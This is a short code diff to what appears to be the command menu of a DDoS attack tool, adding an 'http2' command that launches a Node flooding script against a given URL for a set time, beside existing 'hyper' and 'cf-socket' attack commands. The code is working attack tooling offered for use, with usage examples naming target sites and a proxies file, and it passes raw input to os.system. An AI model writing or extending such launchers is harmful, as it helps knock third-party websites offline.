@@ -290,6 +290,15 @@ def main():
             except IndexError:
                 print('Usage: hyper <url> <time>')
                 print('Example: hyper http://vailon.com 60')
+
+        elif "http2" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node http2 {url} {time}')
+            except IndexError:
+                print('Usage: http2 <url> proxies.txt <time> 64 1')
+                print('Example: http2 http://segay.com/ 60')
                 
         elif "cf-socket" in cnc:
             try:
